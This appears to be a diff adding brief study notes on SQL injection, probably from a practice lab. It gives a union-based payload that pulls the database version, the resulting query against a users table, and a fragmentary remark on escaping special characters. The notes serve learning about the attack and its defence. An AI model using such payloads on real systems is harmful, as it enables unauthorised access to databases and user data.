@@ -1,0 +1,5 @@
+1.3 m' and '1'='0' union select null, version() #
+
+    SELECT first_name, last_name FROM users WHERE user_id='m' AND '1'='0' union select null, version() #'
+
+2.1 escape special characters find special characters
